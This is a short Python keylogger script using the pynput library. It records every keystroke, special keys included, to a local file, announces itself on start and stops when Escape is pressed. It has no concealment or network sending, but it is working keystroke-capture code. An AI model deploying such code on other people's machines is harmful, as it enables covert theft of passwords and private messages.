from pynput import keyboard
import time

# File to save the keystrokes
log_file = "key_log.txt"

def on_press(key):
    """
    Callback function that is called when a key is pressed.
    It appends the pressed key to the log file.
    """
    try:
        with open(log_file, 'a') as f:
            # Try to write the character of the key
            f.write(key.char)
    except AttributeError:
        # If the key doesn't have a char attribute (like special keys), handle them
        with open(log_file, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.tab:
                f.write('\t')
            else:
                # Write other special keys in brackets, e.g., [Key.shift]
                f.write(f' [{key}] ')

def on_release(key):
    """
    Callback function that is called when a key is released.
    It stops the listener if the Escape key is pressed.
    """
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger started. Logs are being saved to 'key_log.txt'.")
    print("Press ESC to stop the logger.")
    
    # Set up the listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
